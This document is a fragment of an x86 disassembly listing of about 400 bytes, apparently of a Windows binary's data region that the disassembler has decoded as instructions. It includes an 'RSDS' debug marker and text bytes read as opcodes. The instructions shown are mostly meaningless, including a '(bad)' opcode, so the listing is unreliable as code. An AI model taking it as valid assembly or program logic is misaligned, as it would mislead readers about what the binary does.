  413c20:	adc    BYTE PTR [eax],al
  413c22:	sbb    BYTE PTR ds:0x3d1c0041,bh
  413c28:	inc    ecx
  413c29:	add    BYTE PTR [eax],ah
  413c2b:	cmp    eax,0x3d240041
  413c30:	inc    ecx
  413c31:	add    BYTE PTR [eax],ch
  413c33:	cmp    eax,0x3d2c0041
  413c38:	inc    ecx
  413c39:	add    BYTE PTR [eax],dh
  413c3b:	cmp    eax,0x3d340041
  413c40:	inc    ecx
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esi+0x4df185],bh
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [edx],al
  413c5d:	add    BYTE PTR [eax],al
  413c5f:	add    BYTE PTR [eax+0x0],dl
  413c62:	add    BYTE PTR [eax],al
  413c64:	inc    eax
  413c65:	cmp    eax,0x31400001
  413c6a:	add    DWORD PTR [eax],eax
  413c6c:	scas   al,BYTE PTR es:[edi]
  413c6d:	inc    ebp
  413c6e:	adc    BYTE PTR [eax],al
  413c70:	inc    esp
  413c71:	cmp    edx,DWORD PTR [eax]
  413c73:	add    BYTE PTR [edi+0x4e],bl
  413c76:	adc    BYTE PTR [eax],al
  413c78:	push   0x4b
  413c7a:	adc    BYTE PTR [eax],al
  413c7c:	cmp    edx,DWORD PTR fs:[eax]
  413c7f:	add    BYTE PTR [eax+0x43001057],bl
  413c85:	sbb    dl,BYTE PTR [eax]
  413c87:	add    BYTE PTR [esi+0x39],bl
  413c8a:	adc    BYTE PTR [eax],al
  413c8c:	idiv   BYTE PTR [ebx]
  413c8e:	inc    ecx
  413c8f:	add    dl,bh
  413c91:	cmp    eax,DWORD PTR [ecx+0x0]
  413c94:	(bad)  
  413c95:	cmp    eax,DWORD PTR [ecx+0x0]
  413c98:	add    bh,BYTE PTR [ecx+eax*2]
  413c9b:	add    BYTE PTR [esi],al
  413c9d:	cmp    al,0x41
  413c9f:	add    BYTE PTR [edx],cl
  413ca1:	cmp    al,0x41
  413ca3:	add    BYTE PTR [esi],cl
  413ca5:	cmp    al,0x41
  413ca7:	add    BYTE PTR [edx],dl
  413ca9:	cmp    al,0x41
  413cab:	add    BYTE PTR [esi],dl
  413cad:	cmp    al,0x41
  413caf:	add    BYTE PTR [edx],bl
  413cb1:	cmp    al,0x41
  413cb3:	add    BYTE PTR [esi],bl
  413cb5:	cmp    al,0x41
  413cb7:	add    al,bl
  413cb9:	cmp    al,0x41
  413cbb:	add    ah,bl
  413cbd:	cmp    al,0x41
  413cbf:	add    al,ah
  413cc1:	cmp    al,0x41
  413cc3:	add    ah,ah
  413cc5:	cmp    al,0x41
  413cc7:	add    al,ch
  413cc9:	cmp    al,0x41
  413ccb:	add    ah,ch
  413ccd:	cmp    al,0x41
  413ccf:	add    al,dh
  413cd1:	cmp    al,0x41
  413cd3:	add    ah,dh
  413cd5:	cmp    al,0x41
  413cd7:	add    BYTE PTR [ebp+0x16],ah
  413cda:	adc    BYTE PTR [eax],al
  413cdc:	sub    BYTE PTR [ecx+0x10],0x0
  413ce0:	cli    
  413ce1:	adc    BYTE PTR [bx+si],al
  413ce4:	sbb    BYTE PTR [ecx],al
  413ce6:	adc    BYTE PTR [eax],al
  413ce8:	pop    edi
  413ce9:	inc    esp
  413cea:	adc    BYTE PTR [eax],al
  413cec:	sbb    BYTE PTR [edx],ch
  413cee:	adc    BYTE PTR [eax],al
  413cf0:	in     eax,dx
  413cf1:	pop    ss
  413cf2:	adc    BYTE PTR [eax],al
  413cf4:	pop    esp
  413cf5:	sub    BYTE PTR [eax],dl
  413cf7:	add    BYTE PTR [esp+edi*1+0x41],ch
  413cfb:	add    BYTE PTR [eax+0x3c],dh
  413cfe:	inc    ecx
  413cff:	add    BYTE PTR [esp+edi*1+0x41],dh
  413d03:	add    BYTE PTR [eax+0x3c],bh
  413d06:	inc    ecx
  413d07:	add    BYTE PTR [esp+edi*1+0x41],bh
  413d0b:	add    BYTE PTR [eax-0x7bffbec4],al
  413d11:	cmp    al,0x41
  413d13:	add    BYTE PTR [eax-0x17ffbec4],cl
  413d19:	aaa    
  413d1a:	adc    BYTE PTR [eax],al
  413d1c:	cmp    DWORD PTR [esi],0x51e90010
  413d22:	adc    BYTE PTR [eax],al
  413d24:	push   cs
  413d25:	dec    eax
  413d26:	adc    BYTE PTR [eax],al
  413d28:	mov    ah,0x22
  413d2a:	adc    BYTE PTR [eax],al
  413d2c:	lock xor BYTE PTR [eax],dl
  413d2f:	add    BYTE PTR [edi+0x6b],ah
  413d32:	adc    BYTE PTR [eax],al
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	or     eax,0x10
  413d3a:	add    BYTE PTR [eax],al
  413d3c:	add    BYTE PTR [eax],al
  413d3e:	add    BYTE PTR [eax],al
  413d40:	push   edx
  413d41:	push   ebx
  413d42:	inc    esp
  413d43:	push   ebx
  413d44:	or     al,0x19
  413d46:	popa   
  413d47:	out    0x4a,al
  413d49:	cwde   
  413d4a:	dec    ecx
  413d4b:	inc    ebp
  413d4c:	pushf  
  413d4d:	shl    DWORD PTR [eax+0x1749a96b],1
  413d53:	call   0x3a45:0x1
  413d5a:	pop    esp
  413d5b:	dec    ecx
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	jae    0x413dd3
  413d5f:	popa   
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	ins    BYTE PTR es:[edi],dx
  413d62:	and    BYTE PTR [eax+0x61],dl
  413d65:	je     0x413dcf
  413d67:	pop    esp
  413d68:	push   ebx
  413d69:	outs   dx,BYTE PTR gs:[esi]
  413d6b:	fs push ebx
  413d6d:	dec    ebp
  413d6e:	push   ebx
  413d6f:	pop    esp
  413d70:	dec    ebp
  413d71:	popa   
  413d72:	imul   ebp,DWORD PTR [esi+0x5c],0x46627553
  413d79:	outs   dx,DWORD PTR ds:[esi]
  413d7a:	ins    BYTE PTR es:[edi],dx
  413d7b:	fs gs jb 0x413ddb
  413d7f:	dec    ecx
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413d85:	gs jae 0x413de4
  413d88:	dec    ecx
  413d89:	outs   dx,BYTE PTR ds:[esi]
  413d8a:	outs   dx,WORD PTR ds:[esi]
  413d8c:	inc    ecx
  413d8d:	jo     0x413dff
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [eax],al
  413d93:	add    BYTE PTR [esi+0x4df185],bh
  413d99:	add    BYTE PTR [eax],al
  413d9b:	add    dl,al
  413d9d:	cmp    eax,0x10001
  413da2:	add    BYTE PTR [eax],al
  413da4:	add    DWORD PTR [eax],eax
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    DWORD PTR [eax],eax
  413daa:	add    BYTE PTR [eax],al
  413dac:	mov    eax,0xbc00013d
  413db1:	cmp    eax,0x3dc00001
  413db6:	add    DWORD PTR [eax],eax
  413db8:	mov    ds:0xce000026,al
  413dbd:	cmp    eax,0x1
  413dc2:	push   ebx
  413dc3:	jns    0x413e32
  413dc5:	bound  ebp,QWORD PTR [edi+0x6c]
  413dc8:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  413dcf:	inc    ebx
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	outs   dx,DWORD PTR ds:[esi]
  413dd2:	jae    0x413e39
  413dd4:	push   edi
  413dd5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  413ddc:	popa   
  413ddd:	je     0x413e48
  413ddf:	outs   dx,DWORD PTR ds:[esi]
  413de0:	outs   dx,BYTE PTR ds:[esi]
  413de1:	inc    ebx
  413de2:	ins    BYTE PTR es:[edi],dx
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	jae    0x413e4b
  413de6:	push   edi
  413de7:	.byte 0x69
